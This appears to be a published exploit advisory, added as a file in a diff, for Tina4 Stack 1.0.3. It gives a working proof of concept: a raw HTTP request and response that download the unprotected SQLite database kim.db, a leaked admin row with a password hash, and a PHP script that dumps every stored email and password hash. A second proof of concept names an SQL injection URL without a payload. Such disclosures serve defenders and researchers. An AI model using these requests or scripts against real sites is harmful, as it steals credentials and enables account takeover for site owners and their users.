@@ -1,0 +1,53 @@
+# Exploit Title: Tina4 Stack 1.0.3 - SQL Injection / Database File Download
+# Dork: N/A
+# Date: 2018-11-09
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://tina4.com/
+# Software Link: https://ayera.dl.sourceforge.net/project/tina4stack/v1.0.3/Release%20V1.0.3.zip
+# Version: 1.0.3
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/kim.db
+# 
+GET /[PATH]/kim.db HTTP/1.1
+Host: TARGET:12345
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+HTTP/1.1 200 OK
+Server: nginx/1.7.7
+Date: Fri, 09 Nov 2018 17:21:23 GMT
+Content-Type: application/octet-stream
+Content-Length: 22528
+Last-Modified: Fri, 09 Nov 2018 17:09:46 GMT
+Connection: keep-alive
+Etag: "5be5bf5a-5800"
+Accept-Ranges: bytes
+
+#
+view-source:kim.db / 3ˆ	AdminAdminadmin$2y$10$ATw/7BHxoZezY0UfffIq3.zAn8bzP6NPBpmh9Qmk5e4X8HHOjLAba2018-11-09 15:25:24Active
+
+#
+<?php
+
+$baglan = new SQLite3('kim.db');
+
+$sonuc = $baglan->query('SELECT * FROM user');
+
+while ($p = $sonuc->fetchArray()) {?>
+
+<h4><?php echo $p['email'];?></h4>
+<h4><?php echo $p['passwd'];?></h4>
+
+<?php } ?>
+
+# POC: 
+# 2)
+# http://localhost/[PATH]/kim/menu/get/1 [SQL]
+#
